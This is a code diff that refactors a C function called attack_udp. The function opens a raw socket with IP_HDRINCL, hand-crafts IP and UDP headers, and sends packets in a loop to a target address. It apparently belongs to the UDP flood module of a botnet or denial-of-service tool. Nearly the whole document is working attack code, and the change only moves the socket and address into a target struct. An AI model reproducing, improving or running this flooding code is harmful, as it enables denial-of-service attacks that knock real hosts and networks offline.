@@ -13,8 +13,6 @@ void attack_udp(struct target_data *target)
 	char buffer[BUFFER_SIZE];
 	struct ip_hdr *iph = (struct ip_hdr *)buffer;
 	struct udp_hdr *udph = (struct udp_hdr *)(buffer + sizeof(struct ip_hdr));
-	struct sockaddr_in addr;
-	int sockfd;
 
 	srand(time(NULL));
 	iph->version = 4;
@@ -34,17 +32,17 @@ void attack_udp(struct target_data *target)
 	udph->length = htons(sizeof(struct udp_hdr));
 	udph->checksum = 0;
 
-	addr.sin_family = AF_INET;
-	addr.sin_port = 0;
-	addr.sin_addr.s_addr = target->target_addr;
+	target->addr.sin_family = AF_INET;
+	target->addr.sin_port = 0;
+	target->addr.sin_addr.s_addr = target->target_addr;
 
 	/* initialize raw socket */
-	if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1) {
+	if ((target->sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1) {
 		exit(EXIT_FAILURE);
 	}
 
 	int enable = 1;
-	if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(int)) == -1) {
+	if (setsockopt(target->sockfd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(int)) == -1) {
 		exit(EXIT_FAILURE);
 	}
 
@@ -59,7 +57,8 @@ void attack_udp(struct target_data *target)
 		udph->checksum = 0;
 		udph->checksum = checksum_udp(iph, udph, NULL, 0);
 
-		if (sendto(sockfd, buffer, iph->length, 0, (struct sockaddr *)&addr,
+		if (sendto(target->sockfd, buffer, iph->length, 0,
+				(struct sockaddr *)&target->addr,
 				sizeof(struct sockaddr_in)) == -1) {
 			exit(EXIT_FAILURE);
 		}
